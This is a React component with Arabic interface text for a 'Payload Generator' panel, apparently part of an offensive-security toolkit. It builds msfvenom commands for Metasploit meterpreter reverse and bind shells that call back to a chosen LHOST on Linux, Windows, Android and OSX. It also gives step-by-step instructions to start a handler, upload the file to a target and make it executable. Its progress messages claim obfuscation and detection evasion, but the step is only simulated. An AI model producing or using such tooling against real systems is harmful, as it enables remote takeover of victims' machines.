import React, { useState } from 'react';
import { motion } from 'motion/react';
import { Zap, Terminal, Shield, Download, Cpu, Code, Globe, Server, Copy, Check, FileCode } from 'lucide-react';

interface PayloadGeneratorProps {
  onAction?: (action: string) => void;
}

export const PayloadGenerator: React.FC<PayloadGeneratorProps> = ({ onAction }) => {
  const [os, setOs] = useState('linux');
  const [arch, setArch] = useState('x64');
  const [payloadType, setPayloadType] = useState('reverse_tcp');
  const [lhost, setLhost] = useState('192.168.1.10');
  const [lport, setLport] = useState('4444');
  const [isGenerating, setIsGenerating] = useState(false);
  const [progress, setProgress] = useState(0);
  const [statusMessage, setStatusMessage] = useState('');
  const [generatedPayload, setGeneratedPayload] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [errors, setErrors] = useState<{ lhost?: string; lport?: string }>({});
  const [touched, setTouched] = useState<{ lhost?: boolean; lport?: boolean }>({});

  // Real-time validation
  React.useEffect(() => {
    if (touched.lhost || touched.lport) {
      validateInputs();
    }
  }, [lhost, lport]);

  const validateInputs = () => {
    const newErrors: { lhost?: string; lport?: string } = {};
    
    // Validate LHOST (IP or Hostname)
    const ipRegex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    const hostRegex = /^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$/;
    
    if (!lhost.trim()) {
      newErrors.lhost = 'العنوان (LHOST) مطلوب';
    } else if (!ipRegex.test(lhost.trim()) && !hostRegex.test(lhost.trim())) {
      newErrors.lhost = 'يرجى إدخال عنوان IP صحيح أو Hostname صالح';
    }

    // Validate LPORT (1-65535)
    const portNum = parseInt(lport);
    if (!lport.trim()) {
      newErrors.lport = 'المنفذ (LPORT) مطلوب';
    } else if (isNaN(portNum)) {
      newErrors.lport = 'المنفذ يجب أن يكون رقماً';
    } else if (portNum < 1 || portNum > 65535) {
      newErrors.lport = 'المنفذ خارج النطاق المسموح (1-65535)';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleGenerate = () => {
    setTouched({ lhost: true, lport: true });
    if (!validateInputs()) {
      setStatusMessage('خطأ: تأكد من صحة بيانات الاتصال أولاً');
      return;
    }

    setIsGenerating(true);
    setGeneratedPayload(null);
    setProgress(0);
    setStatusMessage('بدء عملية التوليد...');
    
    const steps = [
      { p: 15, m: 'تحليل الإعدادات المحددة...' },
      { p: 30, m: 'تجهيز بيئة التجميع (Compilation Environment)...' },
      { p: 50, m: 'توليد الكود المصدري للحمولة...' },
      { p: 75, m: 'تشفير الحمولة وتجنب الكشف (Obfuscation)...' },
      { p: 90, m: 'التحقق النهائي من سلامة الكود...' },
      { p: 100, m: 'تم التوليد بنجاح!' }
    ];

    let currentStep = 0;
    const interval = setInterval(() => {
      if (currentStep < steps.length) {
        setProgress(steps[currentStep].p);
        setStatusMessage(steps[currentStep].m);
        currentStep++;
      } else {
        clearInterval(interval);
        
        let format = 'elf';
        if (os === 'windows') format = 'exe';
        if (os === 'android') format = 'apk';
        
        // Override format based on payload type
        if (payloadType === 'shellcode') format = 'raw';
        if (payloadType === 'dll') format = 'dll';
        if (payloadType === 'powershell_script') format = 'ps1';
        if (payloadType === 'python_reverse') format = 'py';
        if (payloadType === 'php_reverse') format = 'php';

        const payloadPath = `${os}/${arch}/meterpreter/${payloadType.includes('reverse') ? payloadType : 'reverse_tcp'}`;
        const payload = `msfvenom -p ${payloadPath} LHOST=${lhost} LPORT=${lport} -f ${format} -o payload.${format}`;
        
        setGeneratedPayload(payload);
        setIsGenerating(false);
        setStatusMessage(`تم توليد حمولة ${payloadType} بنجاح لنظام ${os}`);
      }
    }, 500);
  };

  const handleCopy = () => {
    if (!generatedPayload) return;
    
    const instructions = [
      "1. قم بتشغيل مستمع (Listener) على جهازك باستخدام Metasploit: use exploit/multi/handler",
      "2. ارفع الملف المولد إلى الهدف باستخدام أي وسيلة انتقال (FTP, HTTP, etc.)",
      "3. امنح صلاحيات التنفيذ للملف: chmod +x payload.elf"
    ].join('\n');
    
    const textToCopy = `Payload:\n${generatedPayload}\n\nInstructions:\n${instructions}`;
    
    navigator.clipboard.writeText(textToCopy).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  };

  const handleDownload = () => {
    if (!generatedPayload) return;
    const ext = os === 'windows' ? 'exe' : os === 'android' ? 'apk' : 'elf';
    const blob = new Blob([generatedPayload], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `payload.${ext}`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  return (
    <div className="flex-1 flex flex-col overflow-hidden bg-[var(--bg-secondary)] p-4 md:p-6">
      <div className="flex items-center justify-between mb-6">
        <div>
          <h2 className="text-lg font-black uppercase tracking-[3px] text-[var(--text-primary)] flex items-center gap-3">
            <Zap className="text-[var(--accent-orange)]" size={20} />
            مولد الحمولات البرمجية (Payload Generator)
          </h2>
          <p className="text-[10px] text-[var(--text-muted)] font-mono mt-1 uppercase tracking-widest">ADVANCED_EXPLOIT_PAYLOAD_CONSTRUCTION_KIT</p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 flex-1 overflow-hidden">
        {/* Configuration Panel */}
        <div className="lg:col-span-1 space-y-6 overflow-y-auto custom-scrollbar pr-2">
          <div className="space-y-4">
            <div className="flex items-center gap-2 text-[var(--accent-orange)]">
              <Cpu size={16} />
              <h3 className="text-xs font-black uppercase tracking-widest">إعدادات الهدف</h3>
            </div>
            
            <div className="space-y-3">
              <div className="space-y-1.5">
                <label className="text-[10px] font-bold uppercase text-[var(--text-muted)]">نظام التشغيل (OS)</label>
                <select 
                  value={os}
                  onChange={(e) => setOs(e.target.value)}
                  className="w-full bg-[var(--bg-input)] border border-[var(--border-color)] rounded-md px-3 py-2 text-xs text-[var(--text-primary)] outline-none focus:border-[var(--accent-orange)] transition-colors"
                >
                  <option value="linux">Linux</option>
                  <option value="windows">Windows</option>
                  <option value="android">Android</option>
                  <option value="osx">OSX</option>
                </select>
              </div>

              <div className="space-y-1.5">
                <label className="text-[10px] font-bold uppercase text-[var(--text-muted)]">المعمارية (Architecture)</label>
                <select 
                  value={arch}
                  onChange={(e) => setArch(e.target.value)}
                  className="w-full bg-[var(--bg-input)] border border-[var(--border-color)] rounded-md px-3 py-2 text-xs text-[var(--text-primary)] outline-none focus:border-[var(--accent-orange)] transition-colors"
                >
                  <option value="x64">x64</option>
                  <option value="x86">x86</option>
                  <option value="armle">ARM</option>
                  <option value="mipsle">MIPS</option>
                </select>
              </div>

              <div className="space-y-1.5">
                <label className="text-[10px] font-bold uppercase text-[var(--text-muted)]">نوع الحمولة (Payload Type)</label>
                <select 
                  value={payloadType}
                  onChange={(e) => setPayloadType(e.target.value)}
                  className="w-full bg-[var(--bg-input)] border border-[var(--border-color)] rounded-md px-3 py-2 text-xs text-[var(--text-primary)] outline-none focus:border-[var(--accent-orange)] transition-colors"
                >
                  <option value="reverse_tcp">Reverse TCP</option>
                  <option value="bind_tcp">Bind TCP</option>
                  <option value="reverse_https">Reverse HTTPS</option>
                  <option value="shellcode">Shellcode (Raw)</option>
                  <option value="dll">DLL Payload</option>
                  <option value="exe">EXE Payload</option>
                  <option value="powershell_script">PowerShell Script</option>
                  <option value="python_reverse">Python Reverse Shell</option>
                  <option value="php_reverse">PHP Reverse Shell</option>
                  <option value="war">WAR Payload (Java)</option>
                  <option value="jsp">JSP Payload</option>
                </select>
              </div>
            </div>
          </div>

          <div className="space-y-4">
            <div className="flex items-center gap-2 text-[var(--accent-cyan)]">
              <Globe size={16} />
              <h3 className="text-xs font-black uppercase tracking-widest">إعدادات الاتصال</h3>
            </div>
            
            <div className="space-y-3">
              <div className="space-y-1.5">
                <label className="text-[10px] font-bold uppercase text-[var(--text-muted)] flex justify-between">
                  <span>LHOST (Local IP)</span>
                  {touched.lhost && errors.lhost && <span className="text-[var(--accent-red)] animate-pulse">! مسار غير صالح</span>}
                </label>
                <input 
                  type="text"
                  value={lhost}
                  onChange={(e) => setLhost(e.target.value)}
                  onBlur={() => setTouched(prev => ({ ...prev, lhost: true }))}
                  placeholder="192.168.1.10"
                  className={`w-full bg-[var(--bg-input)] border ${touched.lhost && errors.lhost ? 'border-[var(--accent-red)] shadow-[0_0_8px_rgba(255,51,102,0.2)]' : 'border-[var(--border-color)]'} rounded-md px-3 py-2 text-xs text-[var(--text-primary)] font-mono outline-none focus:border-[var(--accent-cyan)] transition-all`}
                />
                {touched.lhost && errors.lhost && (
                  <motion.p 
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: 'auto' }}
                    className="text-[9px] text-[var(--accent-red)] font-bold mt-1"
                  >
                    {errors.lhost}
                  </motion.p>
                )}
              </div>

              <div className="space-y-1.5">
                <label className="text-[10px] font-bold uppercase text-[var(--text-muted)] flex justify-between">
                  <span>LPORT (Local Port)</span>
                  {touched.lport && errors.lport && <span className="text-[var(--accent-red)] animate-pulse">! خطأ في المنفذ</span>}
                </label>
                <input 
                  type="text"
                  value={lport}
                  onChange={(e) => setLport(e.target.value)}
                  onBlur={() => setTouched(prev => ({ ...prev, lport: true }))}
                  placeholder="4444"
                  className={`w-full bg-[var(--bg-input)] border ${touched.lport && errors.lport ? 'border-[var(--accent-red)] shadow-[0_0_8px_rgba(255,51,102,0.2)]' : 'border-[var(--border-color)]'} rounded-md px-3 py-2 text-xs text-[var(--text-primary)] font-mono outline-none focus:border-[var(--accent-cyan)] transition-all`}
                />
                {touched.lport && errors.lport && (
                  <motion.p 
                    initial={{ opacity: 0, height: 0 }}
                    animate={{ opacity: 1, height: 'auto' }}
                    className="text-[9px] text-[var(--accent-red)] font-bold mt-1"
                  >
                    {errors.lport}
                  </motion.p>
                )}
              </div>
            </div>
          </div>

          <motion.button 
            onClick={handleGenerate}
            disabled={isGenerating}
            animate={touched.lhost && (errors.lhost || errors.lport) ? { x: [0, -4, 4, -4, 4, 0] } : {}}
            transition={{ duration: 0.4 }}
            className={`w-full py-3 ${
              touched.lhost && (errors.lhost || errors.lport) 
                ? 'bg-[rgba(255,51,102,0.1)] border-[rgba(255,51,102,0.3)] text-[var(--accent-red)]' 
                : 'bg-[rgba(255,136,0,0.1)] border-[rgba(255,136,0,0.2)] text-[var(--accent-orange)]'
            } border rounded-md text-[11px] font-black uppercase tracking-[2px] hover:brightness-110 transition-all active:scale-95 disabled:opacity-50 flex items-center justify-center gap-2`}
          >
            {isGenerating ? (
              <>
                <div className="w-3 h-3 border-2 border-current border-t-transparent rounded-full animate-spin" />
                جاري التوليد...
              </>
            ) : (
              <>
                <Zap size={14} />
                توليد الحمولة (GENERATE)
              </>
            )}
          </motion.button>
        </div>

        {/* Output Panel */}
        <div className="lg:col-span-2 flex flex-col overflow-hidden bg-[rgba(10,14,23,0.4)] border border-[var(--border-color)] rounded-[var(--radius-lg)]">
          <div className="px-4 py-3 border-b border-[var(--border-color)] bg-[rgba(255,255,255,0.02)] flex items-center justify-between">
            <div className="flex items-center gap-2">
              <Code size={14} className="text-[var(--text-secondary)]" />
              <span className="text-xs font-black uppercase tracking-wider">كود الحمولة المولد (Generated Output)</span>
            </div>
            {generatedPayload && (
              <div className="flex items-center gap-2">
                <button 
                  onClick={handleDownload}
                  className="flex items-center gap-2 px-3 py-1 bg-[var(--bg-tertiary)] border border-[var(--border-color)] rounded text-[10px] font-bold uppercase tracking-widest text-[var(--text-secondary)] hover:text-[var(--accent-orange)] hover:border-[var(--accent-orange)] transition-all"
                >
                  <Download size={12} />
                  تحميل (Download)
                </button>
                <button 
                  onClick={handleCopy}
                  className="flex items-center gap-2 px-3 py-1 bg-[var(--bg-tertiary)] border border-[var(--border-color)] rounded text-[10px] font-bold uppercase tracking-widest text-[var(--text-secondary)] hover:text-[var(--accent-cyan)] hover:border-[var(--accent-cyan)] transition-all"
                >
                  {copied ? <Check size={12} className="text-[var(--accent-green)]" /> : <Copy size={12} />}
                  {copied ? 'تم النسخ' : 'نسخ الكل'}
                </button>
              </div>
            )}
          </div>
          
          <div className="flex-1 p-6 font-mono text-sm overflow-y-auto custom-scrollbar relative">
            {isGenerating ? (
              <div className="absolute inset-0 flex flex-col items-center justify-center space-y-6 bg-[rgba(10,14,23,0.85)] backdrop-blur-md z-10 p-8">
                <div className="relative w-24 h-24">
                  <div className="absolute inset-0 border-4 border-[rgba(255,136,0,0.1)] rounded-full" />
                  <motion.div 
                    className="absolute inset-0 border-4 border-[var(--accent-orange)] border-t-transparent rounded-full"
                    animate={{ rotate: 360 }}
                    transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                  />
                  <div className="absolute inset-0 flex items-center justify-center text-xs font-black text-[var(--accent-orange)]">
                    {progress}%
                  </div>
                </div>
                
                <div className="w-full max-w-xs space-y-2">
                  <div className="h-1.5 w-full bg-[rgba(255,255,255,0.05)] rounded-full overflow-hidden">
                    <motion.div 
                      className="h-full bg-[var(--accent-orange)]"
                      initial={{ width: 0 }}
                      animate={{ width: `${progress}%` }}
                    />
                  </div>
                  <p className="text-[10px] font-black uppercase tracking-widest text-[var(--accent-orange)] text-center animate-pulse">
                    {statusMessage}
                  </p>
                </div>
              </div>
            ) : null}

            {generatedPayload ? (
              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="space-y-6"
              >
                {statusMessage && (
                  <div className="flex items-center gap-2 px-3 py-2 bg-[rgba(0,255,157,0.1)] border border-[rgba(0,255,157,0.2)] rounded text-[var(--accent-green)] text-[10px] font-bold uppercase tracking-wider animate-in fade-in slide-in-from-top-2">
                    <Check size={12} />
                    {statusMessage}
                  </div>
                )}
                <div className="p-4 rounded bg-[var(--bg-tertiary)] border border-[var(--border-color)] text-[var(--accent-green)] break-all">
                  {generatedPayload}
                </div>
                
                <div className="space-y-4">
                  <div className="text-[10px] font-black uppercase tracking-widest text-[var(--text-muted)]">تعليمات التنفيذ (Execution Instructions)</div>
                  <div className="space-y-2">
                    <div className="flex items-start gap-3 p-3 rounded bg-[rgba(255,255,255,0.02)] border border-[var(--border-color)]">
                      <div className="w-5 h-5 rounded-full bg-[rgba(0,240,255,0.1)] text-[var(--accent-cyan)] flex items-center justify-center text-[10px] font-bold shrink-0">1</div>
                      <p className="text-[11px] text-[var(--text-secondary)]">قم بتشغيل مستمع (Listener) على جهازك باستخدام Metasploit: <code className="text-[var(--accent-cyan)]">use exploit/multi/handler</code></p>
                    </div>
                    <div className="flex items-start gap-3 p-3 rounded bg-[rgba(255,255,255,0.02)] border border-[var(--border-color)]">
                      <div className="w-5 h-5 rounded-full bg-[rgba(0,240,255,0.1)] text-[var(--accent-cyan)] flex items-center justify-center text-[10px] font-bold shrink-0">2</div>
                      <p className="text-[11px] text-[var(--text-secondary)]">ارفع الملف المولد إلى الهدف باستخدام أي وسيلة انتقال (FTP, HTTP, etc.)</p>
                    </div>
                    <div className="flex items-start gap-3 p-3 rounded bg-[rgba(255,255,255,0.02)] border border-[var(--border-color)]">
                      <div className="w-5 h-5 rounded-full bg-[rgba(0,240,255,0.1)] text-[var(--accent-cyan)] flex items-center justify-center text-[10px] font-bold shrink-0">3</div>
                      <p className="text-[11px] text-[var(--text-secondary)]">امنح صلاحيات التنفيذ للملف: <code className="text-[var(--accent-cyan)]">chmod +x payload.elf</code></p>
                    </div>
                  </div>
                </div>

                <div className="flex gap-3">
                  <button 
                    onClick={() => {
                      if (generatedPayload) {
                        onAction?.(`deploy ${payloadType}`);
                      }
                    }}
                    className="flex-1 flex items-center justify-center gap-2 px-6 py-2.5 bg-[var(--accent-orange)] text-[var(--bg-primary)] rounded-md font-black text-[10px] uppercase tracking-[2px] hover:shadow-[0_0_15px_rgba(255,136,0,0.4)] transition-all active:scale-95"
                  >
                    <Zap size={14} />
                    نشر الحمولة (DEPLOY)
                  </button>
                  <button className="flex items-center gap-2 px-6 py-2.5 bg-[var(--accent-cyan)] text-[var(--bg-primary)] rounded-md font-black text-[10px] uppercase tracking-[2px] hover:shadow-[0_0_15px_rgba(0,240,255,0.4)] transition-all active:scale-95">
                    <Download size={14} />
                    تحميل (DL)
                  </button>
                </div>
              </motion.div>
            ) : (
              <div className="h-full flex flex-col items-center justify-center text-[var(--text-muted)] opacity-30 space-y-4">
                <Terminal size={48} strokeWidth={1} />
                <p className="text-xs uppercase tracking-widest">Configure parameters and click generate</p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
